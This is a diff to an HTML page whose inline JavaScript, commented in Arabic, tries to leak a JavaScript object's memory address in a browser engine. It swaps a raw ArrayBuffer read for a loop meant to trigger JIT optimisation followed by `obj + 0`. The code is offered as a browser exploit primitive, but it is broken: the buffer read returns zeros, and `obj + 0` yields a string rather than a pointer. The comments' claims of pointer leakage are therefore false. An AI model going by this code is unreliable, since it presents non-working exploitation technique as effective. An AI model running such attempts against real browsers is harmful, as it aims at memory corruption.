@@ -5,28 +5,29 @@
 <script>
     function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
     
+    // دالة "مسممة" تجبر الـ JIT على العمل
+    function getAddress(o) {
+        // هذه الحيلة تجبر المحرك على تحويل الكائن إلى قيمة أولية (Primitive)
+        // مما يكشف أحياناً عن المؤشر الداخلي
+        return o + 0; 
+    }
+
     try {
-        let obj = { x: 0x1234 };
-        let buffer = new ArrayBuffer(0x100);
-        let view = new DataView(buffer);
+        let obj = { a: 1 };
+        log("بدء تهيئة الـ JIT...");
         
-        // استخدام تقنية "التداخل" لربط مصفوفة بذاكرة الكائن
-        let arr = [obj]; 
+        // تشغيل الدالة عدة مرات لجعل المحرك يقوم بـ JIT Optimization
+        for(let i = 0; i < 10000; i++) { getAddress(0.1); }
         
-        // محاولة تسريب العنوان الداخلي للكائن
-        // هنا نجبر المحرك على قراءة البيانات الخام للمصفوفة
-        log("جاري محاولة تسريب عنوان كائن...");
-        
-        // سنحاول قراءة أول 8 بايتات من مساحة المصفوفة
-        // إذا نجحنا، سنرى عنوان الذاكرة (Memory Address) للكائن obj
-        let leakedAddress = view.getBigUint64(0);
-        
-        log("العنوان المسرب (Address): " + leakedAddress.toString(16));
+        // الآن نحاول تسريب عنوان الكائن
+        let addr = getAddress(obj);
+        log("العنوان الذي تم تسريبه عبر الـ JIT: " + addr.toString(16));
         
     } catch(e) {
-        log("خطأ في التسريب: " + e.message);
+        log("خطأ: " + e.message);
     }
 </script>
+
 
 
 </body>
